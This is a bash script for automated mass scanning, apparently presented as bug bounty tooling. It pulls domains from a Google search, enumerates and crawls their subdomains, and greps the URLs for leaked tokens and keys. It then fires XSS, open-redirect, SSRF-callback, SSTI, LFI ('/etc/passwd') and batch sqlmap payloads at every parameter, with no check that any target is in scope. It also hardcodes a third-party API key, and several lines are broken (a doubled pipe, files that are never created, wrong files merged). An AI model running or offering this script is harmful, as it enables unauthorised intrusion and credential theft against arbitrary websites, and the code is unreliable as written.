#!/bin/bash

# Default values
LIMIT=10
QUERY="inurl:/bug bounty"

# Parse command-line arguments
while [[ "$#" -gt 0 ]]; do
    case "$1" in
        --limit) LIMIT="$2"; shift ;;
        --query) QUERY="$2"; shift ;;
        *) echo "Unknown parameter: $1"; exit 1 ;;
    esac
    shift
done

# Ensure required Python packages are installed
if ! python3 -c "import googlesearch" &>/dev/null; then
    echo "Installing googlesearch-python..."
    pip install googlesearch-python
fi

if ! python3 -c "import tldextract" &>/dev/null; then
    echo "Installing tldextract..."
    pip install tldextract
fi

# Fetch Google results and extract main domains
python3 - <<EOF
from googlesearch import search
import tldextract

query = "$QUERY"
num_results = int("$LIMIT")

results = search(query, num_results=num_results)

unique_domains = set()
for url in results:
    extracted = tldextract.extract(url)
    main_domain = f"{extracted.domain}.{extracted.suffix}"
    if main_domain:
        unique_domains.add(main_domain)

with open("bug_bounty_domains.txt", "w") as f:
    for domain in unique_domains:
        print(domain)
        f.write(domain + "\n")
EOF

echo "Extraction complete! Check 'bug_bounty_domains.txt'"

echo "==================================="
echo "💀 Salaar Bug Bounty Automation 💀"
echo "==================================="

# Enumerate subdomains
echo "[+] Enumerating subdomains..."
subfinder -dL bug_bounty_domains.txt >> subs-temp.txt
cat bug_bounty_domains.txt | assetfinder --subs-only >> subs-temp.txt
cat bug_bounty_domains.txt | while read -r domain; do
    curl -s "https://crt.sh/?q=%.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g'
done | sort -u >> subs-temp.txt
cat bug_bounty_domains.txt | chaos -silent -key 6aa57816-004b-429c-a02b-d1344c1abeb7 >> subs-temp.txt

cat subs-temp.txt | sort -u | shuf | tee subdomains.txt
rm subs-temp.txt

# Filter out dead domains
cat subdomains.txt | httpx -silent -o live-subdomains.txt

# Crawl URLs and extract data
cat live-subdomains.txt | katana -d 5 -o /opt/katana-urls.txt
grep "=" /opt/katana-urls.txt | qsreplace salaar > /opt/katana-params.txt
grep ".js" /opt/katana-urls.txt > /opt/katana-js-files.txt
grep -Ei "token=|key=|apikey=|access_token=|secret=|auth=|password=|session=|jwt=|bearer=|Authorization=|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY" /opt/katana-urls.txt > /opt/katana-secrets.txt
grep -Ei "wp-content|wp-login|wp-admin|wp-includes|wp-json|xmlrpc.php|wordpress|wp-config|wp-cron.php" /opt/katana-urls.txt > /opt/katana-wordpress.txt
rm /opt/katana-urls.txt


cat subdomains.txt | urlfinder >> /opt/urlfinder-urls.txt
cat /opt/urlfinder-urls.txt | grep = | qsreplace salaar >> /opt/urlfinder-params.txt
cat /opt/urlfinder-urls.txt | grep .js >> /opt/urlfinder-js-files.txt
cat /opt/urlfinder-urls.txt | grep -Ei "token=|key=|apikey=|access_token=|secret=|auth=|password=|session=|jwt=|bearer=|Authorization=|Bearer |eyJ|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY" >> /opt/urlfinder-kong.txt
cat /opt/urlfinder-urls.txt | grep -Ei "wp-content|wp-login|wp-admin|wp-includes|wp-json|xmlrpc.php|wordpress|wp-config|wp-cron.php" >> /opt/urlfinder-wordpress.txt
rm /opt/urlfinder-urls.txt

 #Hakrawler Crawling
cat live-subdomains.txt | hakrawler -u -i -insecure -o /opt/hakrawler-urls.txt
grep "=" /opt/hakrawler-urls.txt | qsreplace salaar > /opt/hakrawler-params.txt
grep ".js" /opt/hakrawler-urls.txt > /opt/hakrawler-js-files.txt
grep -Ei "token=|key=|apikey=|access_token=|secret=|auth=|password=|session=|jwt=|bearer=|Authorization=|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY" /opt/hakrawler-urls.txt > /opt/hakrawler-secrets.txt
grep -Ei "wp-content|wp-login|wp-admin|wp-includes|wp-json|xmlrpc.php|wordpress|wp-config|wp-cron.php" /opt/hakrawler-urls.txt > /opt/hakrawler-wordpress.txt
rm /opt/hakrawler-urls.txt

for domain in $(cat subdomains.txt); do  
    curl -s "http://web.archive.org/cdx/search/cdx?url=*.$domain/*&output=text&fl=original" | sort -u >> /opt/wayback-urls.txt  
    sleep $((RANDOM % 5 + 3))  # Random delay (3-7 seconds)
done

cat /opt/wayback-urls.txt   | grep = | qsreplace salaar >> /opt/way-params.txt
cat /opt/wayback-urls.txt   | grep .js >> /opt/way-js-files.txt
cat /opt/wayback-urls.txt   | grep -Ei "token=|key=|apikey=|access_token=|secret=|auth=|password=|session=|jwt=|bearer=|Authorization=|Bearer |eyJ|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY" >> /opt/way-kong.txt
cat /opt/wayback-urls.txt   | grep -Ei "wp-content|wp-login|wp-admin|wp-includes|wp-json|xmlrpc.php|wordpress|wp-config|wp-cron.php" >> /opt/way-wordpress.txt
rm  /opt/wayback-urls.txt

# Consolidate Data
cat /opt/katana-params.txt /opt/urlfinder-params.txt /opt/hakrawler-params.txt /opt/way-params.txt /opt/gau-params.txt | sort -u >> params.txt
rm /opt/katana-params.txt /opt/urlfinder-params.txt /opt/hakrawler-params.txt /opt/way-params.txt /opt/gau-params.txt

cat /opt/katana-js-files.txt /opt/urlfinder-params.txt /opt/hakrawler-params.txt /opt/way-js-files.txt /opt/gau-js-files.txt | sort -u >> js-files.txt
rm /opt/katana-js-files.txt /opt/urlfinder-params.txt /opt/hakrawler-params.txt /opt/way-js-files.txt /opt/gau-js-files.txt

cat /opt/katana-kong.txt /opt/urlfinder-kong.txt /opt/hakrawler-kong.txt /opt/way-kong.txt /opt/gau-kong.txt | sort -u >> key-urls.txt
rm /opt/katana-kong.txt /opt/urlfinder-kong.txt /opt/hakrawler-kong.txt /opt/way-kong.txt /opt/gau-kong.txt

cat /opt/katana-wordpress.txt /opt/urlfinder-wordpress.txt /opt/hakrawler-wordpress.txt /opt/way-wordpress.txt /opt/gau-wordpress.txt | sort -u >> wordpress-urls.txt
rm /opt/katana-wordpress.txt /opt/urlfinder-wordpress.txt /opt/hakrawler-wordpress.txt /opt/way-wordpress.txt /opt/gau-wordpress.txt 


# JS File Analysis
cat js-files.txt | nuclei -t /root/nuclei-templates/http/exposures/ -silent -o nuclei-js-results.txt
cat js-files.txt | mantra > js-mantra-results.txt

# Parameter Fuzzing
echo "[+] Fuzzing for XSS..."
cat params.txt | grep -Eiv '\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)($|[?&])' | shuf | qsreplace '<u>hyper</u>' | while read -r host; do
    curl --silent --path-as-is -L --insecure "$host" | grep -qs "<u>hyper" && echo "$host"
done | tee htmli.txt

echo "[+] Fuzzing for Open Redirects..."
cat params.txt | qsreplace 'https://example.com/' | while read -r host; do
    curl -s -L "$host" | grep "<title>Example Domain</title>" && echo "$host"
done | tee open-redirects.txt

echo "[+] Fuzzing for SSRF..."
cat params.txt | qsreplace 'https://salaar.requestcatcher.com/test' | while read -r host; do
    curl --silent --path-as-is -L --insecure "$host" | grep -qs "request caught" && echo "$host"
done | tee ssrf.txt


# Domain Vulnerability Scanning
echo "[+] Running Nuclei on live subdomains..."
cat live-subdomains.txt | nuclei -t /root/nuclei-templates/ -severity low -rl 3 -c 2 -silent -o nuclei-low.txt
cat live-subdomains.txt | nuclei -t /root/nuclei-templates/ -severity medium -rl 3 -c 2 -silent -o nuclei-medium.txt
cat live-subdomains.txt | nuclei -t /root/nuclei-templates/ -severity unknown -rl 3 -c 2 -silent -o nuclei-unknown.txt
cat live-subdomains.txt | nuclei -t /root/nuclei-templates/ -severity high -rl 3 -c 2 -silent -o nuclei-high.txt
cat live-subdomains.txt | nuclei -t /root/nuclei-templates/ -severity critical -rl 3 -c 2 -silent -o nuclei-critical.txt
# Merge Nuclei results
cat nuclei-*.txt | sort -u > nuclei-results.txt
rm nuclei-*.txt

echo "[+] Fuzzing for SSTI..."
cat params.txt | | grep -E "template=|preview=|id=|view=|activity=|name=|content=|redirect=" \
| shuf | qsreplace 'salaar{{7*7}}' | while read -r host; do
    curl --silent --path-as-is -L --insecure "$host" | grep -qs "salaar49" && echo "$host"
done | tee ssti.txt

echo "[+] Fuzzing for LFI..."
cat params.txt | grep -E "file=|document=|folder=|root=|path=|pg=|style=|pdf=|template=|php_path=|doc=|page=|name=|cat=|dir=|action=|board=|date=|detail=|download=|prefix=|include=|inc=|locate=|show=|site=|type=|view=|content=|layout=|mod=|conf=|url=" \
| shuf | qsreplace '../../../../../../etc/passwd' | while read -r host; do
    curl --silent --path-as-is -L --insecure "$host" | grep -qs "root:x" && echo "$host"
done | tee lfi.txt

# SQLMAP
mkdir sqlmap-results
cat params.txt | grep -Ei 'select|report|role|update|query|user|name|sort|where|search|params|process|row|view|table|from|sel|results|sleep|fetch|order|keyword|column|field|delete|string|number|filter' | python3 /opt/sqlmap/sqlmap.py --batch --banner  --output-dir=sqlmap-results/


echo "✅ Script execution completed!"
